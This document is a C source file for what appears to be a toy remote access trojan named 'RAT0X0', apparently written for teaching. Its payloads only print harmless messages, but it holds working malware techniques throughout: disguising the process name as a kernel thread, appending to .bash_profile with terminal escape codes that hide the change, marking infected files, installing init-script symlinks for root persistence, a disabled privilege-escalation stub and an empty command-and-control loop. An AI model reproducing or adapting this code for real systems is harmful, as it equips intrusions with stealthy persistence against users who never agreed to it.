#include <stdio.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


int go_to_hell () {
  pid_t pid;
  
  if ((pid = fork()) != 0) return 0;
  setsid(); // Remove TTY
  if ((pid = fork()) != 0) return 0;
  
  return 0;
}

#define USER_PERSISTENCE 0
#define SYS_PERSISTENCE 1


int escalate () {
  if (getuid () == 0) return SYS_PERSISTENCE;
#if 0
  extract_info ();
  if (find_exploit ()) {
    apply_exploit (); // This will actually run the RAT
	exit (1);         // so we are done
  }
#endif
  return USER_PERSISTENCE;
}

int append_str (char *fname, char *str) {
  int fd = open (fname, O_APPEND | O_WRONLY);
  if (fd < 0) perror ("open:");
  if (write (fd, str, strlen (str)) < 0) perror ("write:");
  close (fd);
}
int check_update1 (char *fname) {
  unsigned char buffer [1024];
  int i, fd = open (fname, O_RDONLY);
  do {
    int len = read (fd, buffer, 1024);
    for (i = 0; i < len; i++)
      if (buffer[i] == '\010') {
	printf ("File %s already infected\n", fname);
	return 0;
      }
	
    if (len == 0) break;
  } while (1);
  close (fd);
  return 1;
}
unsigned char is_updated (char *fname) {
  unsigned char buffer, res = 1;
  int fd = open (fname, O_RDONLY);
  do {
       int len = read (fd, &buffer, 1);
       if (len <= 0) break;
       if (buffer == '\010') {
	     printf ("- File %s already infected\n", fname);
		 res = 0;
	     break;
       }
     } while (1);
  close (fd);
  return res;
}


int persistence_user () {
  printf ("Applying User Persistence\n");
  // apply user persistence
  if (is_updated ("./.bash_profile"))
    {
      append_str ("./.bash_profile", "echo \"I am some harmless malware\"\n");
      append_str ("./.bash_profile", "#\033[1A\033[2K\033[1A\n");
      append_str ("./.bash_profile", "PATH=$HOME/bin:$PATH\n");
      append_str ("./.bash_profile", "#\033[2K\033[1A\033[2K\010");
    }
  return 0;
}

int create_from_str (char *fname, int runlevel, char *str) {
  char target[1024] = "./rcX.d/S99malware";
  int fd = open (fname, O_CREAT | O_WRONLY, 0777);
  if (fd < 0) perror ("open:");
  if (write (fd, str, strlen (str)) < 0) perror ("write:");
  close (fd);
  target[4] = '0' + runlevel;
  symlink (fname, target);
}

char script[] =
  "#!/bin/bash\n"
  "echo \"I'm malware\"\n"
  "# Doing bad things here";

int persistence_root () {
  printf ("Applying System Persistence\n");
  create_from_str ("./init.d/malware", 3, script);
  // apply root persistence
  return 0;
}

int persistence_root1 () {
  printf ("Applying System Persistence\n");
  unsigned char buffer[1024];
  getcwd (buffer, 1024);
  strcat (buffer, "/rat0x0-05\0");
  symlink (buffer, "./rc3.d/S99rat0x0");
  printf ("%s\n", buffer);
  return 0;
}

int payload () {
  while (1) {
    // C2C communication loop
    usleep (1000);
  }
}

int main (int argc, char *argv[]) {
  int (*persistence[2])() = {persistence_user, persistence_root1};

  printf ("This is RAT0X0 version 0.2\n");
  // go_to_hell ();
  strcpy (argv[0],"[Jbd2/sda0-8]");
  persistence [escalate ()]();
  payload ();
}
